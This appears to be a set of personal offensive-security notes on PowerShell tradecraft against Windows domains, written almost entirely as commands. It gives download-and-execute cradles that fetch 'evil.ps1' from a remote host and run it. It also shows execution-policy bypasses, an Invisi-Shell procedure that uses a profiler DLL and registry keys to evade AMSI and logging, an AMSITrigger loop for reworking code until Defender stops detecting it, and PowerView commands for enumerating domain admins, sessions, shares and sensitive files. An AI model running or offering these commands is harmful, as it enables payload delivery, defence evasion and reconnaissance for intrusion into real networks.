### Powershell Scripts/Modules


Import Script or Module :heavy_check_mark:
```
Import-Module C:\path\to\script.ps1
```

Find all commands in module 
```
Get-Command -Module <modulename>
```

Download & Execute Cradle :heavy_check_mark:
```
iex (New-Object Net.WebClient) .DownloadString('https://webservers/payload.ps1')
```

??
```
$ie=New-Object -ComObjectInternetExplorer.Application;$ie.visible=$False;$ie.navigate('http://192.168.230.1/evil.ps1');sleep 5;$response=$ie.Document.body.innerHTML;$ie.quit();iex $response
```
```
$h=New-Object -ComObject
Msxml2.XMLHTTP;$h.open('GET','http://192.168.230.1/evil.ps1',$false);$h.send();iex
$h.responseText
```
```
$wr = [System.NET.WebRequest]::Create("http://192.168.230.1/evil.ps1")
$r = $wr.GetResponse()
IEX ([System.IO.StreamReader]($r.GetResponseStream())).ReadToEnd()
```




### Powershell Detection
- System-wide transcription
- Script Block Logging
- AMSI (AntMalware Scan Interface)
- CLM (Constrained Language Mode)
 - Integration with Applocker & WDAC (Device Guard)

#### Bypasses
##### Execution Policy
:heavy_check_mark:
```
powershell -ExecutionPolicy bypass
```
```
powershell -c <cmd>
```
:heavy_check_mark:
```
powershell -encodedcommand
```
```
$env:PSExecutionPolicyPreference="bypass"
```

#### Security
##### AMSI

[Invisi-Shell](https://github.com/OmerYa/Invisi-Shell) :sparkles:

###### **with admin privileges**
```
set COR_ENABLE_PROFILING=1
set COR_PROFILER={cf0d821e-299b-5307-a3d8-b283c03916db}
set COR_PROFILER_PATH=%~dp0InvisiShellProfiler.dll

powershell

set COR_ENABLE_PROFILING=
set COR_PROFILER=
set COR_PROFILER_PATH=
```

###### **with non-admin privileges**
```
set COR_ENABLE_PROFILING=1
set COR_PROFILER={cf0d821e-299b-5307-a3d8-b283c03916db}

REG ADD "HKCU\Software\Classes\CLSID\{cf0d821e-299b-5307-a3d8-b283c03916db}" /f
REG ADD "HKCU\Software\Classes\CLSID\{cf0d821e-299b-5307-a3d8-b283c03916db}\InprocServer32" /f
REG ADD "HKCU\Software\Classes\CLSID\{cf0d821e-299b-5307-a3d8-b283c03916db}\InprocServer32" /ve /t REG_SZ /d "%~dp0InvisiShellProfiler.dll" /f

powershell

set COR_ENABLE_PROFILING=
set COR_PROFILER=
REG DELETE "HKCU\Software\Classes\CLSID\{cf0d821e-299b-5307-a3d8-b283c03916db}" /f
```

:broom: can be cleaned up with an *exit* command

#### AV Signatures - Windows Defender
[AMSITrigger](https://github.com/RythmStick/AMSITrigger)
This application will go through the script and indicate where it is being detected
```
AmsiTrigger_x64.exe -i C:\path\*.ps1
```
1. Scan using AMSITrigger
2. Modify the detected code
3. Rescan
4. Repeat the steps 2 & 3 till we get a result as “AMSI_RESULT_NOT_DETECTED” or “Blank”

Further steps can be taken to full obfuscate scripts with [Invoke-Obfuscation](https://github.com/danielbohannon/Invoke-Obfuscation)



### Enumeration
#### PowerView
Get Current Domain
```
Get-Domain
```

Get object of another domain
```
	Get-Domiain -Domain xxx.local
```

Get domain SID for current domain
```
	Get-DomainSID
```

Get domain policy for the current domain
```
	Get-DomainPolicyData
```

Get domain policy for another domain
```
	Get-DomainPolicyData --domain xxx.local
```

Get domain controllers for the current domain
```
	Get-DomainController
```

Get domain controllers for another domain
```
	Get-DomainController –Domain xxx.local
```

Get a list of users in the current domain
```
	Get-DomainUser
```
```
	Get-DomainUser -Identity <user>
```

Get list of all properties for users in the current domain
```
	Get-DomainUser -Identity <user> -Properties *
```
```
	Get-DomainUser -Properties samaccountname,logonCount
```



Search for a particular string in a user's attributes:
```
	Get-DomainUser -LDAPFilter "Description=*built*" | Select name,Description
```

Get a list of computers in the current domain
```
	Get-DomainComputer | select Name	
```
```
	Get-DomainComputer –OperatingSystem "*Server 2016*"
```
```
	Get-DomainComputer -Ping
```


Get all the groups in the current domain
```
	Get-DomainGroup | select Name	
```
```
	Get-DomainGroup –Domain <targetdomain>
```

Get all groups containing the word "admin" in group name
```
	Get-DomainGroup *admin*
```

Get all the members of the Domain Admins group
```
	Get-DomainGroupMember -Identity "Domain Admins" -Recurse
```

Get the group membership for a user:
```
	Get-DomainGroup –UserName "<user>"
```

List all the local groups on a machine (needs administrator privs on non-dc
machines) :
```
	Get-NetLocalGroup -ComputerName dcorp-dc -ListGroups
```

Get members of all the local groups on a machine 
*(needs administrator privs on non-dc machines)*
```
	Get-NetLocalGroup -ComputerName <corp>-dc -Recurse
```

Get members of the local group "Administrators" on a machine 
*(needs administrator privs on non-dc machines)* :
```
	Get-NetLocalGroupMember -ComputerName <corp>-dc -GroupNameAdministrators
```


Get actively logged users on a computer (needs local admin rights on
the target)
```
	Get-NetLoggedon –ComputerName <servername>
```



Get locally logged users on a computer (needs remote registry on the
target - started by-default on server OS)
```
	Get-LoggedonLocal -ComputerName <corp>-dc
```

Get the last logged user on a computer (needs administrative rights and
remote registry on the target)
```
	Get-LastLoggedOn –ComputerName <servername>
```


Find shares on hosts in current domain.
```
	Invoke-ShareFinder –Verbose
```


Find sensitive files on computers in the domain
```
	Invoke-FileFinder –Verbose
```


Get all fileservers of the domain
```
	Get-NetFileServer
```











#### ActiveDirectory Module










